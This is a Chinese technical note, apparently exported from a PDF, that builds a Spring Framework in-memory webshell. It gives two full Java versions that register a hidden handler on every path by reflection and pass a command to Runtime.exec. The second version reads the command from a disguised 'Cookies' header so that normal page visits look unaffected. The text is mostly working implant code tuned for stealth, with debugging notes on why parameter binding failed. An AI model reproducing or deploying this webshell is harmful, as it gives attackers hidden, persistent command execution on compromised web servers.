1
CVE-OLOO-OOXVQ扩展
中午看了下这篇⽂章https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg，发现了点问题，记
录下 
选⽤RequestMapping内存⻢，demo如下
2
测试的时候发现注⼊可以成功，但⽆法访问executeCommand⽅法，查看报错堆栈，提示参数错误，没
有指定executeCommand需要的String参数，但实际有传。 
Java
复制代码
public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerHandlerMethod = 
requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandle
rMethod", Object.class, Method.class, RequestMappingInfo.class);
            registerHandlerMethod.setAccessible(true);
            Method executeCommand = 
SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", 
String.class);
            PathPattern pathPattern = new 
PathPatternParser().parse("/*");
            PatternsRequestCondition patternsRequestCondition = new 
PatternsRequestCondition(pathPattern);
            ParamsRequestCondition paramsRequestCondition = new 
ParamsRequestCondition("cmd");
            RequestMappingInfo requestMappingInfo = new 
RequestMappingInfo("", patternsRequestCondition, null, 
paramsRequestCondition, null, null, null, null);
            registerHandlerMethod.invoke(requestMappingHandlerMapping, 
new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);
            msg = "inject-success";
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }
    public ResponseEntity executeCommand(String cmd) throws IOException {
        //        cmd = "calc";"calc"
        String execResult = new 
Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\
A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
3
报错在AbstractNamedValueArgumentResolver.class#updateNamedValueInfo，parameter对象⾥没
获取到参数名，另外或者info.name能获取到也⾏ 
查看上级调⽤，info是通过this.createNamedValueInfo返回的 
4
这个⽅法的重写⽅法对应的类，仔细观察都是各种spring⾥的注解解析类，其实到这也就明⽩了为啥⽆
法传参，是因为我们的⽅法没有注解，⽆法解析参数。 
这个其实⼀开头就应该发现的，我们要写的是  RequestMapping 内存⻢，⾃然应该想到通过注解来
提取参数。像  @RequestParam 、  @PathVariable 等等。 
这⾥采⽤  @RequestHeader  
修改代码如下 
5
注⼊成功 
Java
复制代码
public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerHandlerMethod = 
requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandle
rMethod", Object.class, Method.class, RequestMappingInfo.class);
            registerHandlerMethod.setAccessible(true);
            Method executeCommand = 
SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", 
String.class);
            PathPattern pathPattern = new 
PathPatternParser().parse("/*");
            PatternsRequestCondition patternsRequestCondition = new 
PatternsRequestCondition(pathPattern);
//            ParamsRequestCondition paramsRequestCondition = new 
ParamsRequestCondition("Cmd");
            HeadersRequestCondition headersRequestCondition = new 
HeadersRequestCondition("Cookies");
            RequestMappingInfo requestMappingInfo = new 
RequestMappingInfo("", patternsRequestCondition, null, null, 
headersRequestCondition, null, null, null);
            registerHandlerMethod.invoke(requestMappingHandlerMapping, 
new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);
            msg = "inject-success";
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }
    public ResponseEntity executeCommand(@RequestHeader(value = 
"Cookies") String cmd) throws IOException {
//        cmd = "calc";"calc"
        String execResult = new 
Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\
A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
6
头部插⼊命令即可，如果指定头部没有，就是正常⻚⾯访问，不影响业务。 
⾃动化 
7
⾄于为啥⽂章⾥不需要这么操作也能⽤，暂时不得⽽知。 
然后这个⻢存在的问题还有，因为是requestMapping，如果存在拦截器、过滤器等做认证，就会存在
⽆法访问的问题。